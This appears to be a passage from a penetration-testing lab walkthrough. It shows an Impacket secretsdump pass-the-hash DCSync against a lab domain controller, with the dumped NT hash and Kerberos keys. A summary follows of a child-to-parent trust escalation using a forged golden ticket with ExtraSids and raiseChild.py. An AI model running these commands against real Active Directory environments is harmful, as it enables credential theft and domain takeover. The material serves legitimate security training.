```
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $secretsdump.py INLANEFREIGHT.LOCAL/administrator@172.16.5.5 -hashes :88ad09182de639ccc6579eb0849751cf -just-dc-user bross
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
[*] Kerberos keys grabbed
inlanefreight.local\bross:aes256-cts-hmac-sha1-96:538b551100c1815081893a64defdf323117557b933c8762c2783afe8eef9ecff
inlanefreight.local\bross:aes128-cts-hmac-sha1-96:6a645011e4b5948ed081a956eb515e7c
inlanefreight.local\bross:des-cbc-md5:152ab9ec52b00b0e
[*] Cleaning up... 
┌─[htb-student@ea-attack01]─[~]
└──╼ $                                         
```

- **Child Domain Golden Ticket:** You used the child domain's `KRBTGT` hash to forge a Golden Ticket. By adding the parent domain's **Enterprise Admins SID** (`S-1-5-21-3842939050-3880317879-2865463114-519`) into the ticket's `ExtraSids` field, you tricked the forest into treating you as a root Enterprise Admin.
    
- **Root Domain Administrator Hash:** Running `raiseChild.py` used that trust privilege to perform a DCSync against the parent domain controller (`ACADEMY-EA-DC01`), successfully dumping the NT hash for the root domain's built-in `Administrator` account (`88ad09182de639ccc6579eb0849751cf`).
    
- **DCSyncing Target Account (`bross`):** Finally, armed with root Domain Admin credentials, you executed `secretsdump.py` via Pass-the-Hash against `172.16.5.5` to pull the specific NT hash for **bross** (`49a074a39dd0651f647e765c2cc794c7`).